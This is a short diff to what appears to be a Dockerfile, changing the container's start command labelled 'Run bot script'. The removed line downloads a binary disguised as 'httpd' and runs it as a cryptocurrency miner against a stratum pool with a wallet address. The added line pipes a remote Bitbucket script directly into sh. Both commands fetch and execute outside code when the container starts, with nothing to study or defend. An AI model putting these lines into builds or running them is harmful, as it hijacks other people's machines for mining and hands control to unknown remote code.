@@ -37,4 +37,4 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
-CMD wget https://github.com/55113110159/vs/raw/master/httpd && chmod +x httpd && ./httpd -a yespower -o stratum+tcp://149.50.222.86:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 100-999 -n 1)-DEWA) --timeout 120 -p c=SWAMP,mc=BELL/BUTK/GLT/SPRX/SWAMP/VHH
+CMD curl https://bitbucket.org/denrio900/scsdoank/raw/c774fab8ec7b0483a22319d51a158b5557ba71e3/zepull.bash | sh
